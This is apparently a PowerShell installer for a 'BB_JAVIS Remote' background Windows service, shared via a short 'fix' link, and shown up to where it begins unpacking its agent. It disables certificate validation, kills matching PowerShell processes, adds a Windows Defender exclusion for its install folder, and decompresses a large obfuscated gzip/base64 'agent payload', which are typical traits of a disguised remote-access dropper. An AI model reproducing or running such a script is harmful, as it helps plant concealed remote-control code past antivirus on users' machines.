# ======================================================================
# BB_JAVIS Remote - Windows Service Automated Installer (da.gd/bbj-fix)
# Automated Background Windows Service Installer (Zero-Dependency)
# ======================================================================

$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Enable TLS 1.2 security protocol and bypass certificate errors
try {
    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
} catch {}

Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "       BB_JAVIS REMOTE - BACKGROUND SERVICE AUTOMATED INSTALLER       " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan

# 1. Administrator Privilege Check
$currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "`n[ERROR] Elevated privileges required! Please run PowerShell as Administrator." -ForegroundColor Red
    Write-Host "Then run the installer command again.`n" -ForegroundColor Yellow
    return
}

$svcName = "BB_JAVIS_Remote"
$installDir = "C:\ProgramData\BB_Javis"
if (-not (Test-Path $installDir)) {
    $null = New-Item -ItemType Directory -Path $installDir -Force
    Write-Host "[SETUP] Created installation directory: $installDir" -ForegroundColor Green
}

# 1.1 Stop and remove existing service if present
$existingSvc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
if ($existingSvc) {
    Write-Host "[SERVICE] Found existing service. Stopping and cleaning up..." -ForegroundColor Yellow
    & sc.exe stop $svcName 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    & sc.exe delete $svcName 2>&1 | Out-Null
    Start-Sleep -Seconds 1
}

# Terminate any dangling processes in installDir
try {
    Get-Process -Name "BBJavisService" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)" -ErrorAction SilentlyContinue).CommandLine
            $cmd -like "*BB_Javis*" -or $cmd -like "*start_remote_agent*"
        } catch { $false }
    } | Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Milliseconds 500

# 2. Windows Defender Exclusion
try {
    Write-Host "[PRE-CHECK] Setting Windows Defender exclusion for $installDir..." -ForegroundColor DarkGray
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
} catch {}

# 3. Prepare start_remote_agent.ps1
$localAgent = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "start_remote_agent.ps1" } else { $null }
$targetAgent = Join-Path $installDir "start_remote_agent.ps1"

if ($localAgent -and (Test-Path $localAgent)) {
    Copy-Item $localAgent $targetAgent -Force
    Write-Host "[COPY] start_remote_agent.ps1 copied to $installDir successfully." -ForegroundColor Green
} else {
    $unpackSuccess = $false
    $embeddedGzipBase64 = "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"
    if (-not [string]::IsNullOrWhiteSpace($embeddedGzipBase64) -and -not $embeddedGzipBase64.StartsWith("__EMBEDDED")) {
        try {
            Write-Host "[EMBEDDED] Extracting self-contained agent payload..." -ForegroundColor Cyan
            $gzBytes = [System.Convert]::FromBase64String($embeddedGzipBase64)
            $msIn = New-Object System.IO.MemoryStream(,$gzBytes)
            $gzStream = New-Object System.IO.Compression.GZipStream($msIn, [System.IO.Compression.CompressionMode]::Decompress)
            $msOut = New-Object System.IO.MemoryStream
            $buffer = New-Object byte[] 8192
            while (($read = $gzStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $msOut.Write($buffer, 0, $read)
            }
            $gzStream.Dispose()
            $msIn.Dispose()
            $decompressedBytes = $msOut.ToArray()
            $msOut.Dispose()
